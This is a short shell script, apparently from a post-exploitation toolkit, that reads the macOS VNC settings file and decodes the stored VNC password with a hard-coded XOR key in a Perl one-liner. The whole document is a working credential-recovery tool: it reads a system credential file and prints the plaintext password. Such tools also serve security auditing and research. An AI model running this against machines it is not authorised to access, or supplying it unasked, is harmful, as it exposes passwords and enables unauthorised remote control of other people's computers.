#!/bin/sh
#
# Description: Get the VNC password from MAC OS X
# Requires: perl
#
FILE=/Library/Preferences/com.apple.VNCSettings.txt
if [ ${UNAME} = "Darwin" ]; then
	if [ -f $FILE ]; then
		cat $FILE | perl -wne 'BEGIN { @k = unpack "C*", pack "H*", "1734516E8BA8C5E2FF1C39567390ADCA"}; chomp; @p = unpack "C*", pack "H*", $_; foreach (@k) { printf "%c", $_ ^ (shift @p || 0) }; print "\n"'
	else
		echo "File $FILE does not exist!"
		exit 1
	fi
else
	echo "You're not using OS X!"
	exit 1
fi
